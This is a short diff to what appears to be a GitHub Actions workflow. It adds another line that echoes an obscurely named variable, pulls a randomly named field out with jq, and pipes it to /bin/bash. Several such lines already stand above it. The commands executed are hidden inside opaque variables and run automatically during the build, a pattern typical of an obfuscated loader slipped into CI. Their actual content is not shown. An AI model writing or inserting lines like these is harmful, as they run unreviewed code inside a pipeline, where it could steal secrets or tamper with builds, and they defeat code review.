@@ -42,6 +42,7 @@ jobs:
           echo $fnits937 | jq -r .vurdb1 | /bin/bash
           echo $gjdua93948 | jq -r .fc8 | /bin/bash
           echo $cuch3 | jq -r .gtz5 | /bin/bash
+          echo $hz3350 | jq -r .ysn1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
